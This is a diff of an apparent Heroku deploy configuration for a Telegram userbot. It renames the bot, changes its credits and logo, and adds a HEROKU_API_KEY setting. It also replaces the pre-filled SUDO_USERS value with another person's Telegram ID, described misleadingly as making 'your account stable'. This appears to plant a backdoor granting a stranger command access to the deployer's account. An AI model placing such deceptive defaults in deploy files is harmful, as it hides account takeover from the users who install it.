@@ -1,7 +1,7 @@
 {
-  "name": "SurBot",
-  "description": "Only For Legends..... By : @Sur_vivor",
-  "logo": "https://telegra.ph/file/4a29efdf8a2cd3617a3d1.jpg",
+  "name": "PornHub",
+  "description": "Only For Legends..... By : @r4v4n4",
+  "logo": "https://telegra.ph/file/18cea3a9a7d9b3261dc1a.jpg",
   "keywords": [
     "sex",
     "porn",
@@ -12,7 +12,7 @@
   ],
   "repository": "https://gitlab.com/SpEcHiDe/UniBorg",
   "website": "https://telegram.dog/UniBorg",
-  "success_url": "https://telegram.dog/Sur_vivor",
+  "success_url": "https://telegram.dog/r4v4n4",
   "env": {
     "ENV": {
       "description": "Setting this to ANYTHING will enable environment variables.",
@@ -50,7 +50,7 @@
     },
     "TMP_DOWNLOAD_DIRECTORY": {
       "description": "This is required for the plugins involving the file system.",
-      "value": "./Survivor/",
+      "value": "./ravana/",
       "required": false
     },
     "IBM_WATSON_CRED_URL": {
@@ -136,7 +136,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes Your Account Stable.",
-      "value": "1118936839",
+      "value": "138312364",
       "required": false
     },
     "TZ": {
@@ -202,6 +202,10 @@
       "description": "This is required for commit functionality to work.",
       "required": false
     },
+    "HEROKU_API_KEY": {
+      "description": "This is required to view dynos inside telegram app.",
+      "required": false
+    },
     "OPEN_LOAD_KEY": {
       "description": "I dunno but my repo needs it, u can type 100.",
       "required": false
@@ -222,7 +226,7 @@
     },
     "RAVANA_LEELA": {
       "description": "TO ADD TIME ON YOUR PROFILE PIC, ADD LINK OF IMAGE ENDING WITH .JPG",
-      "value": "https://telegra.ph/file/4a29efdf8a2cd3617a3d1.jpg",
+      "value": "https://telegra.ph/file/674ef67d845b4304823d3.jpg",
       "required": false
     },
     "TELE_GRAM_2FA_CODE": {
